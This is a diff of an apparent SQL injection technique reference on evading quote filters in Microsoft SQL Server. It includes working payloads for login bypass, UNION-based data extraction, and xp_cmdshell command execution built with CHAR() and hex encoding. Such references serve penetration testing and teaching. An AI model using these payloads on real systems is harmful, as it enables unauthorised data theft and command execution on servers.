@@ -4,10 +4,10 @@ description: Techniques to avoid using quotes in MSSQL injection
 category: Injection Techniques
 order: 8
 tags: ["bypass", "quotation", "filter evasion"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
-Web applications often implement security filters that block or sanitize quotation marks (`'` or `"`) to prevent SQL injection. These techniques allow you to construct string literals without using quotes in Microsoft SQL Server.
+Web applications often implement security filters that block or escape quotation marks (`'` or `"`) to prevent SQL injection. These techniques allow you to construct string literals without using quotes in Microsoft SQL Server. They matter most in a numeric injection point (`WHERE id = <input>`), where no quote is needed to break out of the query and escaping quotes does not stop the injection.
 
 ## Using CHAR() Function
 
@@ -30,16 +30,19 @@ SET @a = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)
 
 ## Using Hexadecimal Notation
 
-SQL Server allows representing string literals in hexadecimal:
+A hexadecimal literal is a `varbinary` value. Cast it to `varchar` to use it as a string; compared directly with an `nvarchar` column it is read as UTF-16 bytes and does not match:
 
 ```sql
 -- 'admin' in hex
-SELECT 0x61646D696E
+SELECT CAST(0x61646D696E AS varchar(10))
+
+-- N'admin': UTF-16LE bytes cast to nvarchar
+SELECT CAST(0x610064006D0069006E00 AS nvarchar(10))
 ```
 
 ## Using Unicode Notation
 
-For Unicode strings, you can use the N prefix combined with hex:
+For Unicode strings, `NCHAR()` returns the character for a Unicode code point:
 
 ```sql
 -- N'admin' (Unicode string)
@@ -52,7 +55,7 @@ When you need to compare strings without quotes:
 
 ```sql
 -- Instead of: WHERE username = 'admin'
-WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)
+SELECT * FROM users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)
 ```
 
 ## Using Built-in Functions to Generate Strings
@@ -88,8 +91,8 @@ SELECT name FROM sys.databases WHERE database_id = 1
 -- Original query with quotes:
 -- SELECT * FROM users WHERE username='admin' AND password='password'
 
--- Using CHAR() to avoid quotes:
-' OR username=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)--
+-- Numeric context (WHERE id = <input>), no quote anywhere:
+0 OR username=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)--
 ```
 
 ### Data Extraction with UNION
@@ -98,18 +101,20 @@ SELECT name FROM sys.databases WHERE database_id = 1
 -- Original UNION with quotes:
 -- UNION SELECT 'sensitive_data', NULL, NULL
 
--- Using hex:
-' UNION SELECT 0x73656E7369746976655F64617461, NULL, NULL--
+-- Using hex (numeric context, 3 columns, the second one a string):
+-1 UNION SELECT NULL, CAST(0x73656E7369746976655F64617461 AS varchar(50)), NULL--
 ```
 
 ### System Command Execution
+
+`EXEC` does not accept expressions as parameters (`EXEC xp_cmdshell CHAR(100)+...` is a syntax error), so build the command in a variable first (declaring and assigning in one `DECLARE` needs SQL Server 2008+). Stacked query, numeric context; `xp_cmdshell` needs sysadmin and must be enabled:
 
 ```sql
 -- Original command with quotes:
 -- EXEC xp_cmdshell 'dir C:\'
 
--- Using CHAR() to avoid quotes:
-'; EXEC xp_cmdshell CHAR(100)+CHAR(105)+CHAR(114)+CHAR(32)+CHAR(67)+CHAR(58)+CHAR(92)--
+-- 'dir C:\' built with CHAR() in a variable:
+1; DECLARE @c varchar(20) = CHAR(100)+CHAR(105)+CHAR(114)+CHAR(32)+CHAR(67)+CHAR(58)+CHAR(92); EXEC master..xp_cmdshell @c--
 ```
 
 ## Combining Techniques
@@ -117,11 +122,18 @@ SELECT name FROM sys.databases WHERE database_id = 1
 For complex scenarios, combine multiple techniques:
 
 ```sql
--- Using variables and system functions
-DECLARE @c nvarchar(100)
+-- Procedure name and parameter both in variables
+DECLARE @c nvarchar(100), @p nvarchar(100)
 SELECT @c = CHAR(120) + CHAR(112) + CHAR(95) + CHAR(99) + CHAR(109) + CHAR(100) + CHAR(115) + CHAR(104) + CHAR(101) + CHAR(108) + CHAR(108)
-EXEC @c CHAR(100) + CHAR(105) + CHAR(114)
+SELECT @p = CHAR(100) + CHAR(105) + CHAR(114)
+EXEC @c @p
 -- Executes: EXEC xp_cmdshell 'dir'
+
+-- Any statement, hex-encoded and run with EXEC()
+DECLARE @q varchar(8000)
+SELECT @q = 0x53454C45435420404076657273696F6E
+EXEC(@q)
+-- Executes: SELECT @@version
 ```
 
 ## Using T-SQL String Functions
